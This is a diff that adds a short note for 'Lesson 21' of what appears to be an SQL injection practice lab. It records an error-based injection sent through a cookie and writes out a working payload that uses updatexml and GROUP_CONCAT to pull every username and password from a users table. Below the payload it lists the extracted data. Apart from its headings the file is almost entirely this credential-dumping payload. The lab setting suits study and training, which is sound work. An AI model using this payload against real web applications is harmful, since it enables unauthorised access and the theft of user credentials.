@@ -1,0 +1,8 @@
+SURGICAL FLUSH FOR LESSON 21
+==============================
+VULN TYPE: Error-Based
+METHOD: COOKIE
+PAYLOAD: ') AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x7e,password) FROM users),0x7e),1)-- -
+
+EXTRACTED DATA:
+Dumb
